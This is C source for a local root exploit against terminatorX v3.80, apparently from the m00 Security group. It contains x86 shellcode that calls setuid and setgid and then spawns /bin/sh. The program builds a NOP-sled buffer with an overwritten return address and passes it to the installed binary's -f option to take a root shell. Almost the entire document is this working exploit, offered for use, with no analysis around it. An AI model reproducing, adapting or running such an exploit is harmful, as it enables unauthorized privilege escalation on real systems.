/*******************************************************
*	     terminatorX v3.80 - local root exploit
*	          by m00 Security / Over_G
*
*	  overg[at]mail.ru		www.m00.ru
*
*		   Bugs discovered by c0wboy
********************************************************/

#include <stdio.h>
#include <stdlib.h>


char shellcode[] =      "\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
      			"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
      			"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
      			"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
      			"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd"
      			"\x80\x31\xdb\x89\xd8\xb0\x01\xcd\x80";

unsigned long ret = 0xbffffaaa;


int main(int argc, char ** argv)
{
int i,offset;
char buffer[1266];

  if(argv[1]) { offset=atoi(argv[1]);
  	ret = ret - offset; }

for (i=0; i < (259-strlen(shellcode));i++) buffer[i]=0x90;
memcpy((buffer+259-strlen(shellcode)),shellcode,strlen(shellcode));
memcpy((buffer+259),"A",1);
memcpy((buffer+260), (char*)&ret, 4);



printf("\nterminatorX v3.80 - local root exploit by m00 Security / Over_G\n    	  www.m00.ru		OverG[at]mail.ru\n\n");
printf("Using ret: 0x%08x \n",ret);

execl("/usr/local/bin/terminatorX","terminatorX","-f",buffer,NULL);

}

